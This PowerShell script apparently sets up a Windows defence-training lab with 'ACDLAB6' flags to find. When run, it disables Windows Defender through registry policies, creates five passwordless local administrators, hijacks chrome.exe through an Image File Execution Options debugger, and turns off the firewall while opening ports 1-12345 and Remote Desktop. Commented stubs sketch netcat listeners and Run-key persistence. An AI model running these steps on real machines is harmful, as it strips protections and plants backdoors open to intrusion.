$BadAdminsFlag = "ACDLAB6{Never_should_have_come_here}"
$BadAdminName1 = "Spongebob"
$BadAdminName2 = "Patrick"
$BadAdminName3 = "Mr. Krabs"
$BadAdminName4 = "Sandy"
$BadAdminName5 = "Plankton"

$FirewallFlag = "ACDLAB6{They_took_down_our_shields!}"
$SSHFlag = "ACDLAB6{I_think_this_is_the_wrong_OS}"
$CurrentVersionRunFlag = "ACDLAB6{Autobots_roll_out}"
$NetcatFlag = "ACDLAB6{Nyancat_bootloader_time}"
$SpawnedCMDFlag = "ACDLAB6{Hey_you_shouldn't_be_running_there}"
$InstalledServiceFlag = "ACDLAB6{Definitely_a_legit_service}"
$TaskSchedulerFlag = "ACDLAB6{Wanna_see_me_run_it_again}"


function DisableDefender {
    New-Item -Path "HKLM:\SOFTWARE\Wow6432Node\Policies\Microsoft\" -Name "Windows Defender" -ErrorAction Continue
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1 -Type DWORD -Force -ErrorAction Continue
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows Defender" -Name "DisableRoutinelyTakingAction" -Value 1 -Type DWORD -Force -ErrorAction Continue
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows Defender" -Name "DisableRealtimeMonitoring" -Value 1 -Type DWORD -Force -ErrorAction Continue
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows Defender" -Name "DisableAntiVirus" -Value 1 -Type DWORD -Force -ErrorAction Continue
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows Defender" -Name "DisableSpecialRunningModes" -Value 1 -Type DWORD -Force -ErrorAction Continue
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows Defender" -Name "ServiceKeepAlive" -Value 0 -Type DWORD -Force -ErrorAction Continue

    New-Item -Path 'HKLM:\SOFTWARE\Policies\Microsoft' -Name "Windows Defender" -Force -ErrorAction Continue
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1 -Type DWORD -Force -ErrorAction Continue
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableRoutinelyTakingAction" -Value 1 -Type DWORD -Force -ErrorAction Continue
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableRealtimeMonitoring" -Value 1 -Type DWORD -Force -ErrorAction Continue
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiVirus" -Value 1 -Type DWORD -Force -ErrorAction Continue
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableSpecialRunningModes" -Value 1 -Type DWORD -Force -ErrorAction Continue
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "ServiceKeepAlive" -Value 0 -Type DWORD -Force -ErrorAction Continue

    New-Item -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' -Name "Spynet" -Force -ErrorAction Continue
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" -Name "SpyNetReporting" -Value 0 -Type DWORD -Force -ErrorAction Continue
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" -Name "SubmitSamplesConsent" -Value 0 -Type DWORD -Force -ErrorAction Continue
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" -Name "DisableBlockAtFirstSeen" -Value 1 -Type DWORD -Force -ErrorAction Continue

    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\MRT" -Name "DontReportInfectionInformation" -Value 1 -Type DWORD -Force -ErrorAction Continue

    New-Item -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' -Name "Signature Updates" -Force -ErrorAction Continue
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Signature Updates" -Name "ForceUpdateFromMU" -Value 0 -Type DWORD -Force -ErrorAction Continue

    New-Item -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' -Name "Real-Time Protection" -Force -ErrorAction Continue
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableRealtimeMonitoring" -Value 1 -Type DWORD -Force -ErrorAction Continue
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableOnAccessProtection" -Value 1 -Type DWORD -Force -ErrorAction Continue
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableBehaviorMonitoring" -Value 1 -Type DWORD -Force -ErrorAction Continue
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableScanOnRealtimeEnable" -Value 1 -Type DWORD -Force -ErrorAction Continue

    Add-MpPreference -ExclusionPath "C:\ACDLAB6{Do_you_really_need_AV?}" -ErrorAction Continue
}

function MakeAdmins {
    New-LocalUser -Name $BadAdminName1 -Description $BadAdminsFlag -NoPassword
    New-LocalUser -Name $BadAdminName2 -Description $BadAdminsFlag -NoPassword
    New-LocalUser -Name $BadAdminName3 -Description $BadAdminsFlag -NoPassword
    New-LocalUser -Name $BadAdminName4 -Description $BadAdminsFlag -NoPassword
    New-LocalUser -Name $BadAdminName5 -Description $BadAdminsFlag -NoPassword
    Add-LocalGroupMember -Group "Administrators" -Member $BadAdminName1, $BadAdminName2, $BadAdminName3, $BadAdminName4, $BadAdminName5
}

function ImageFileExecutionOptions {
    New-Item -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options' -Name "chrome.exe" -Force -ErrorAction Continue
    Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\chrome.exe' -Name "Debugger" -Value "C:\chrome.exe" -Type String -Force -ErrorAction Continue
    Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\chrome.exe' -Name "Flag" -Value "ACDLAB6{Can't_touch_this}" -Type String -Force -ErrorAction Continue
}

function DisableFirewall {
    Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
    New-NetFirewallRule -Name "Open Inbound TCP Ports >=)" -DisplayName "Open Inbound TCP Ports" -Description $FirewallFlag -Enabled 1 -Direction Inbound -Action Allow -LocalPort 1-12345 -Protocol TCP
    New-NetFirewallRule -Name "Open Inbound UDP Ports >=)" -DisplayName "Open Inbound UDP Ports" -Description $FirewallFlag -Enabled 1 -Direction Inbound -Action Allow -LocalPort 1-12345 -Protocol UDP
    Enable-NetFirewallRule -DisplayGroup "Remote Desktop" 
}

function InstallSSH {
    # Add-WindowsCapability -Online -Name OpenSSH.Client~~~~0.0.1.0
    # Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
    # Start-Service sshd
    # Set-Service -Name sshd -StartupType 'Automatic' -Description $SSHFlag
    # New-NetFirewallRule -Name sshd -DisplayName 'OpenSSH Server (sshd)' -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22    

    # [System.Environment]::SetEnvironmentVariable('Path','C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Users\Administrator\AppData\Local\Microsoft\WindowsApps;C:\Windows\System32\OpenSSH-Win64;')
    # C:\Windows\System32\OpenSSH-Win64\install-sshd.ps1
    # Start-Service sshd
    # Set-Service sshd -StartupType Automatic -Description $SSHFlag
    # New-NetFirewallRule -Name "OpenSSH" -DisplayName "OpenSSH" -Enabled 1 -Direction Inbound -Action Allow -LocalPort 22 -Protocol TCP -erroraction SilentlyContinue
}

function NetcatListeners {
    # probably replace exe name with flag or something, not sure yet
    # Start-Job -ScriptBlock{C:\Windows\nc.exe -l -p 1337}
    # Start-Job -ScriptBlock{C:\Windows\nc.exe -l -p 1338}
    # Start-Job -ScriptBlock{C:\Windows\nc.exe -l -p 1339}
    # Start-Job -ScriptBlock{C:\Windows\nc.exe -l -p 1340}
    # Start-Job -ScriptBlock{C:\Windows\nc.exe -l -p 1341}
    # Start-Job -ScriptBlock{C:\Windows\nc.exe -l -p 1342}
}

function CurrentVersionRun {
    # Need new names for exes, probably put flags in values next to these
    # New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name NotMalware -Value %SystemRoot%\system32\not_malware.exe -PropertyType ExpandString -Force
    # New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name SuperSafeTotallyLegitProgram -Value %SystemRoot%\system32\SuperSafeTotallyLegitProgram.exe -PropertyType ExpandString -Force
}

function SpawnCMDs {

}

function InstallService {

}

function TaskScheduler {

}

function Main {
    DisableDefender
    MakeAdmins
    ImageFileExecutionOptions
    DisableFirewall
}

Main